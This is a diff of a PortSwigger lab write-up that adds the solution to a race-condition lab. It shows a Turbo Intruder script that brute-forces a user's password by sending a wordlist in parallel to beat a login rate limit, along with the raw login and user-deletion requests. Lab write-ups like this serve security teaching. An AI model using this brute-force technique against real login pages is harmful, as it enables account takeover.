@@ -18,7 +18,7 @@ Solutions to the race conditions labs by [Portswigger](https://portswigger.net/w
 
 **You can log in to your account with the following credentials: *wiener:peter*.**
 
-### Solution
+### Lab 1 Solution
 
 We start out with $50 in our account and the *Lightweight L33t Leather Jacket* costs $1337.00. A promo code **PROMO20** has been provided which gives a 20% discount on the purchase. The following request shows applying the promo code to the purchase:
 
@@ -80,3 +80,122 @@ We get response from the that the promo code has been applied for all the reques
 
 Lab 1 solved.
 
+### [Lab 2: Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
+
+### Lab 2 Task
+
+***This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.***
+
+***To solve the lab:***
+
+**1. Work out how to exploit the race condition to bypass the rate limit.**
+**2. Successfully brute-force the password for the user carlos.**
+**3. Log in and access the admin panel.**
+**4. Delete the user carlos.**
+
+***You can log in to your account with the following credentials: wiener:peter.***
+
+### Lab 2 Solution
+
+A rate limit has been set on the login page, it kicks in after 3 failed login attempts. Below is the request to the login page:
+
+```http
+POST /login HTTP/2
+Host: 0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
+Cookie: session=7nBqtrR6NbeqBYOEmGKAKHQohEkvLfDw
+Content-Length: 69
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-GB
+Upgrade-Insecure-Requests: 1
+Origin: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=I8L3M3lu0dkyAh7bQ1DxfkKJ22bn6DVG&username=carlos&password=123321
+```
+
+The response below shows that rate limit has been reached:
+
+![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-23_lab2_rate-limit.png)
+
+Luckily this lab is similar to the previous one, we've also been provided with a wordlist to brute force the password. We just need to send a large number of requests in parallel using the single packet attack. This is where turbo intruder comes in handy. We can use turbo intruder to send multiple requests in parallel. Below is the code to send the requests:
+
+```python
+def queueRequests(target, wordlists):
+
+    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
+    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
+    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    wordlists = ["123123", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "123456", "password",
+                "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "1234567890", "michael", "x654321", "superman", "1qaz2wsx", 
+                "baseball", "7777777", "121212", "000000"]
+
+    # the 'gate' argument withholds part of each request until openGate is invoked
+    # if you see a negative timestamp, the server responded before the request was complete
+    for word in wordlists:
+        engine.queue(target.req, word, gate='race1')
+
+    # once every 'race1' tagged request has been queued
+    # invoke engine.openGate() to send them in sync
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+Starting the attack the following response is obtained:
+
+![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-42_lab2_attack-table.png)
+
+By sorting the table by the response status code we notice a single request with a 302 status code, this is the request that successfully logged in. We can now proceed to delete the user *carlos* and solve the lab. The image below shows the admin panel:
+
+![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-46_lab2_admin-panel.png)
+
+Now we can delete the user *carlos* and solve the lab.
+
+![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-48_lab2_users.png)
+
+Below is the request to delete the user *carlos*:
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+Host: 0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
+Cookie: session=U06EP2vErkQsawlzICNVHhAADJPO2BbC
+Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-GB
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+```
+
+Response image below:
+
+![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-51_lab2_solved.png)
+
+Lab 2 solved.
